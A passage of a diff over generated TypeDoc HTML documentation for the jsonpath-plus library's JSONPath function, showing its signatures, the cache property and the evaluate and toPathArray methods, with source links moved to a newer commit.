24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>cache</span></a>\n+<!DOCTYPE html><html class=\"default\" lang=\"en\"><head><meta charset=\"utf-8\"/><meta http-equiv=\"x-ua-compatible\" content=\"IE=edge\"/><title>JSONPath | jsonpath-plus</title><meta name=\"description\" content=\"Documentation for jsonpath-plus\"/><meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"/><link rel=\"stylesheet\" href=\"../assets/style.css\"/><link rel=\"stylesheet\" href=\"../assets/highlight.css\"/><script defer src=\"../assets/main.js\"></script><script async src=\"../assets/icons.js\" id=\"tsd-icons-script\"></script><script async src=\"../assets/search.js\" id=\"tsd-search-script\"></script><script async src=\"../assets/navigation.js\" id=\"tsd-nav-script\"></script></head><body><script>document.documentElement.dataset.theme = localStorage.getItem(\"tsd-theme\") || \"os\";document.body.style.display=\"none\";setTimeout(() => app?app.showPage():document.body.style.removeProperty(\"display\"),500)</script><header class=\"tsd-page-toolbar\"><div class=\"tsd-toolbar-contents container\"><div class=\"table-cell\" id=\"tsd-search\" data-base=\"..\"><div class=\"field\"><label for=\"tsd-search-field\" class=\"tsd-widget tsd-toolbar-icon search no-caption\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-search\"></use></svg></label><input type=\"text\" id=\"tsd-search-field\" aria-label=\"Search\"/></div><div class=\"field\"><div id=\"tsd-toolbar-links\"></div></div><ul class=\"results\"><li class=\"state loading\">Preparing search index...</li><li class=\"state failure\">The search index is not available</li></ul><a href=\"../index.html\" class=\"title\">jsonpath-plus</a></div><div class=\"table-cell\" id=\"tsd-widgets\"><a href=\"#\" class=\"tsd-widget tsd-toolbar-icon menu no-caption\" data-toggle=\"menu\" aria-label=\"Menu\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-menu\"></use></svg></a></div></div></header><div class=\"container container-main\"><div class=\"col-content\"><div class=\"tsd-page-title\"><ul class=\"tsd-breadcrumb\"><li><a href=\"../modules.html\">jsonpath-plus</a></li><li><a href=\"JSONPath.html\">JSONPath</a></li></ul><h1>Function JSONPath</h1></div><section class=\"tsd-panel\"><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"JSONPath\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">JSONPath</span><span class=\"tsd-signature-symbol\">&lt;</span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPath.html#JSONPath.T\">T</a><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">options</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../classes/JSONPathClass.html\" class=\"tsd-signature-type tsd-kind-class\">JSONPathClass</a><a href=\"#JSONPath\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><section class=\"tsd-panel\"><h4>Type Parameters</h4><ul class=\"tsd-type-parameter-list\"><li><span><a id=\"JSONPath.T\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-type-parameter\">T</span> = <span class=\"tsd-signature-type\">any</span></span></li></ul></section><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">options</span>: <a href=\"../interfaces/JSONPathOptionsAutoStart.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathOptionsAutoStart</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a href=\"../classes/JSONPathClass.html\" class=\"tsd-signature-type tsd-kind-class\">JSONPathClass</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L225\">jsonpath.d.ts:225</a></li></ul></aside></li><li class=\"tsd-signature tsd-anchor-link\"><a id=\"JSONPath-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">JSONPath</span><span class=\"tsd-signature-symbol\">&lt;</span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPath.html#JSONPath-1.T-1\">T</a><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">options</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"../interfaces/JSONPathCallable.html#JSONPathCallable-1.T-1\">T</a><a href=\"#JSONPath-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><section class=\"tsd-panel\"><h4>Type Parameters</h4><ul class=\"tsd-type-parameter-list\"><li><span><a id=\"JSONPath-1.T-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-type-parameter\">T</span> = <span class=\"tsd-signature-type\">any</span></span></li></ul></section><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">options</span>: <a href=\"../interfaces/JSONPathOptions.html\" class=\"tsd-signature-type tsd-kind-interface\">JSONPathOptions</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"../interfaces/JSONPathCallable.html#JSONPathCallable-1.T-1\">T</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L225\">jsonpath.d.ts:225</a></li></ul></aside></li><li class=\"tsd-signature tsd-anchor-link\"><a id=\"JSONPath-2\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">JSONPath</span><span class=\"tsd-signature-symbol\">&lt;</span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"JSONPath.html#JSONPath-2.T-2\">T</a><span class=\"tsd-signature-symbol\">&gt;</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span>, <span class=\"tsd-kind-parameter\">json</span>, <span class=\"tsd-kind-parameter\">callback</span>, <span class=\"tsd-kind-parameter\">otherTypeCallback</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"../interfaces/JSONPathCallable.html#JSONPathCallable-2.T-2\">T</a><a href=\"#JSONPath-2\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><section class=\"tsd-panel\"><h4>Type Parameters</h4><ul class=\"tsd-type-parameter-list\"><li><span><a id=\"JSONPath-2.T-2\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-type-parameter\">T</span> = <span class=\"tsd-signature-type\">any</span></span></li></ul></section><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">json</span>: <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">callback</span>: <a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></span></li><li><span><span class=\"tsd-kind-parameter\">otherTypeCallback</span>: <a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <a class=\"tsd-signature-type tsd-kind-type-parameter\" href=\"../interfaces/JSONPathCallable.html#JSONPathCallable-2.T-2\">T</a></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L225\">jsonpath.d.ts:225</a></li></ul></aside></li></ul></section><section class=\"tsd-panel-group tsd-index-group\"><section class=\"tsd-panel tsd-index-panel\"><details class=\"tsd-index-content tsd-accordion\" open><summary class=\"tsd-accordion-summary tsd-index-summary\"><h5 class=\"tsd-index-heading uppercase\" role=\"button\" aria-expanded=\"false\" tabIndex=\"0\"><svg width=\"16\" height=\"16\" viewBox=\"0 0 16 16\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronSmall\"></use></svg> Index</h5></summary><div class=\"tsd-accordion-details\"><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Properties</h3><div class=\"tsd-index-list\"><a href=\"JSONPath.html#cache\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-1024\"></use></svg><span>cache</span></a>\n </div></section><section class=\"tsd-index-section\"><h3 class=\"tsd-index-heading\">Methods</h3><div class=\"tsd-index-list\"><a href=\"JSONPath.html#evaluate\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>evaluate</span></a>\n <a href=\"JSONPath.html#toPathArray\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Path<wbr/>Array</span></a>\n <a href=\"JSONPath.html#toPathString\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Path<wbr/>String</span></a>\n <a href=\"JSONPath.html#toPointer\" class=\"tsd-index-link\"><svg class=\"tsd-kind-icon\" viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-2048\"></use></svg><span>to<wbr/>Pointer</span></a>\n </div></section></div></details></section></section><details class=\"tsd-panel-group tsd-member-group tsd-accordion\" open><summary class=\"tsd-accordion-summary\" data-key=\"section-Properties\"><h2><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg> Properties</h2></summary><section><section class=\"tsd-panel tsd-member\"><a id=\"cache\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>cache</span><a href=\"#cache\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><div class=\"tsd-signature\"><span class=\"tsd-kind-property\">cache</span><span class=\"tsd-signature-symbol\">:</span> <span class=\"tsd-signature-type\">any</span></div><div class=\"tsd-comment tsd-typography\"><p>Exposes the cache object for those who wish to preserve and reuse\n it for optimization purposes.</p>\n-</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L179\">jsonpath.d.ts:179</a></li></ul></aside></section></section></details><details class=\"tsd-panel-group tsd-member-group tsd-accordion\" open><summary class=\"tsd-accordion-summary\" data-key=\"section-Methods\"><h2><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg> Methods</h2></summary><section><section class=\"tsd-panel tsd-member\"><a id=\"evaluate\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>evaluate</span><a href=\"#evaluate\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"evaluate.evaluate-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">evaluate</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span>, <span class=\"tsd-kind-parameter\">json</span>, <span class=\"tsd-kind-parameter\">callback</span>, <span class=\"tsd-kind-parameter\">otherTypeCallback</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#evaluate.evaluate-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">json</span>: <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">callback</span>: <a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></span></li><li><span><span class=\"tsd-kind-parameter\">otherTypeCallback</span>: <a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L209\">jsonpath.d.ts:209</a></li></ul></aside></li><li class=\"tsd-signature tsd-anchor-link\"><a id=\"evaluate.evaluate-2\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">evaluate</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">options</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#evaluate.evaluate-2\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">options</span>: <span class=\"tsd-signature-symbol\">{ </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">callback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">json</span><span class=\"tsd-signature-symbol\">: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">otherTypeCallback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">path</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span class=\"tsd-signature-symbol\">}</span></span><ul class=\"tsd-parameters\"><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">callback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></h5></li><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">json</span><span class=\"tsd-signature-symbol\">: </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></h5></li><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">other<wbr/>Type<wbr/>Callback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></h5></li><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">path</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></h5></li></ul></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/39ee1844c610f9fd8925d3095ed3971e3d48025e/src/jsonpath.d.ts#L215\">jsonpath.d.ts:215</a></li></ul></aside></li></ul></section><section class=\"tsd-panel tsd-member\"><a id=\"toPathArray\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>to<wbr/>Path<wbr/>Array</span><a href=\"#toPathArray\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"toPathArray.toPathArray-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">to<wbr/>Path<wbr/>Array</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\">[]</span><a href=\"#toPathArray.toPathArray-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-comment tsd-typography\"><p>Accepts a normalized or unnormalized path as string and\n+</div><div class=\"tsd-comment tsd-typography\"></div><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L179\">jsonpath.d.ts:179</a></li></ul></aside></section></section></details><details class=\"tsd-panel-group tsd-member-group tsd-accordion\" open><summary class=\"tsd-accordion-summary\" data-key=\"section-Methods\"><h2><svg width=\"20\" height=\"20\" viewBox=\"0 0 24 24\" fill=\"none\"><use href=\"../assets/icons.svg#icon-chevronDown\"></use></svg> Methods</h2></summary><section><section class=\"tsd-panel tsd-member\"><a id=\"evaluate\" class=\"tsd-anchor\"></a><h3 class=\"tsd-anchor-link\"><span>evaluate</span><a href=\"#evaluate\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></h3><ul class=\"tsd-signatures\"><li class=\"tsd-signature tsd-anchor-link\"><a id=\"evaluate.evaluate-1\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">evaluate</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">path</span>, <span class=\"tsd-kind-parameter\">json</span>, <span class=\"tsd-kind-parameter\">callback</span>, <span class=\"tsd-kind-parameter\">otherTypeCallback</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#evaluate.evaluate-1\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">path</span>: <span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">json</span>: <br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></span></li><li><span><span class=\"tsd-kind-parameter\">callback</span>: <a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></span></li><li><span><span class=\"tsd-kind-parameter\">otherTypeCallback</span>: <a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></span></li></ul></div><h4 class=\"tsd-returns-title\">Returns <span class=\"tsd-signature-type\">any</span></h4><aside class=\"tsd-sources\"><ul><li>Defined in <a href=\"https://github.com/80avin/JSONPath/blob/8e4acf8aff5f446aa66323e12394ac5615c3b260/src/jsonpath.d.ts#L209\">jsonpath.d.ts:209</a></li></ul></aside></li><li class=\"tsd-signature tsd-anchor-link\"><a id=\"evaluate.evaluate-2\" class=\"tsd-anchor\"></a><span class=\"tsd-kind-call-signature\">evaluate</span><span class=\"tsd-signature-symbol\">(</span><span class=\"tsd-kind-parameter\">options</span><span class=\"tsd-signature-symbol\">)</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">any</span><a href=\"#evaluate.evaluate-2\" aria-label=\"Permalink\" class=\"tsd-anchor-icon\"><svg viewBox=\"0 0 24 24\"><use href=\"../assets/icons.svg#icon-anchor\"></use></svg></a></li><li class=\"tsd-description\"><div class=\"tsd-parameters\"><h4 class=\"tsd-parameters-title\">Parameters</h4><ul class=\"tsd-parameter-list\"><li><span><span class=\"tsd-kind-parameter\">options</span>: <span class=\"tsd-signature-symbol\">{ </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">callback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">json</span><span class=\"tsd-signature-symbol\">: </span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">otherTypeCallback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a><span class=\"tsd-signature-symbol\">; </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-kind-property\">path</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span><span class=\"tsd-signature-symbol\">; </span><br/><span class=\"tsd-signature-symbol\">}</span></span><ul class=\"tsd-parameters\"><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">callback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathCallback</a></h5></li><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">json</span><span class=\"tsd-signature-symbol\">: </span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">string</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">number</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">boolean</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">object</span><br/><span>\u00a0\u00a0\u00a0\u00a0</span><span class=\"tsd-signature-symbol\">| </span><span class=\"tsd-signature-type\">any</span><span class=\"tsd-signature-symbol\">[]</span></h5></li><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">other<wbr/>Type<wbr/>Callback</span><span class=\"tsd-signature-symbol\">: </span><a href=\"../types/JSONPathOtherTypeCallback.html\" class=\"tsd-signature-type tsd-kind-type-alias\">JSONPathOtherTypeCallback</a></h5></li><li class=\"tsd-parameter\"><h5><span class=\"tsd-kind-property\">path</span><span class=\"tsd-signature-symbol\">: </span><span class=\"tsd-signature-type\">string</span><span class=\"tsd-signature-symbol\"> | </span><span class=\"tsd-signature-type\">any</span><span 